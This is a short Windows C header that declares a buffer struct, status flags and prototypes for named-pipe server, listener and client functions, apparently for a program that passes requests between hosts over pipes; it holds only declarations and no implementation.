#pragma once

#include <windows.h>
#include "laikabox.h"
#include "strings_main.h"

typedef struct pipeBuff {
    LPBYTE pbRequestBuffer;
    DWORD cbRequestBytes;
    LPBYTE pbReplyBuffer;
    DWORD cbReplyBytes;
} PIPEBUFF;

extern BOOL pipeThreadSuccess;
extern BOOL listenThreadSuccess;
extern BOOL pipeInternetConnect;
extern BOOL kill;

DWORD WINAPI pipeServer(LPVOID lpvParam);
DWORD WINAPI pipeServerListen(LPVOID lpvParam);
DWORD WINAPI pipeClient(LPSTR lpPipeServerName,
                        LPBYTE lpcbRequest,
                        DWORD cbRequestBytes,
                        LPBYTE lpcbReply,
                        DWORD cbReplyBytesMax,
                        LPDWORD pcbReplyBytes);
BOOL getPipeHostName(LPSTR targetHostName, DWORD nameLenth, DWORD turn);
VOID dummyConnectPipe();
VOID dummyBroadcast();
DWORD GetAnswerToRequest(LPBYTE pchRequest, 
                         DWORD cbRequestBytes,
                         LPBYTE pchReply, 
                         DWORD cbReplyMax,
                         LPDWORD pchReplyBytes);